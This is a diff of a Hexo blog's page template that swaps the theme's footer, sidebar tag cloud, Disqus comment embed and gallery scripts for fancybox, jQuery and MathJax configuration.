-        <h3 class="widget-title">标签云</h3>
-        <div class="widget tagcloud">
-            <a href="/tags/Kali-转载/" style="font-size: 10px;"> - Kali - 转载</a> <a href="/tags/原创/" style="font-size: 15px;"> - 原创</a> <a href="/tags/原创-Hack/" style="font-size: 20px;"> - 原创 - Hack</a> <a href="/tags/原创-Tool/" style="font-size: 10px;"> - 原创 - Tool</a> <a href="/tags/原创-树莓派/" style="font-size: 10px;"> - 原创 - 树莓派</a> <a href="/tags/树莓派-原创/" style="font-size: 10px;"> - 树莓派 - 原创</a> <a href="/tags/转载-Hack/" style="font-size: 10px;"> - 转载 - Hack</a> <a href="/tags/转载-Tool/" style="font-size: 20px;"> - 转载 - Tool</a>
-        </div>
-    </div>
-
-    
-        
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">链接</h3>
-        <div class="widget">
-            <ul>
-                
-                    <li>
-                        <a href="http://hexo.io">Hexo</a>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-
-
-    
-    <div id="toTop" class="fa fa-angle-up"></div>
-</aside>
-            
-        </div>
-        <footer id="footer">
-    <div class="outer">
-        <div id="footer-info" class="inner">
-            &copy; 2016 Ivan<br>
-            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
-        </div>
-    </div>
+  </div>
 </footer>
-        
+    </div>
     
-    <script>
-    var disqus_config = function () {
-        
-            this.page.url = 'http://my.yfgeek.com/2016/08/05/sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu/';
-        
-        this.page.identifier = 'sqlmapzhu-ru-zhi-tamperrao-guo-waffang-huo-qiang-guo-lu';
-    };
-    (function() { 
-        var d = document, s = d.createElement('script');  
-        s.src = '//' + 'hexo-theme-icarus' + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: /
+	}
 </script>
-
-
-
-    
-        <script src="/vendor/lightgallery/js/lightgallery.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-thumbnail.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-pager.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-autoplay.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-fullscreen.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-zoom.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-hash.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-share.min.js"></script>
-        <script src="/vendor/lightgallery/js/lg-video.min.js"></script>
-    
-    
-
-
-
-<!-- Custom Scripts -->
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 <script src="/js/main.js"></script>
 
-    </div>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
 </body>
 </html>
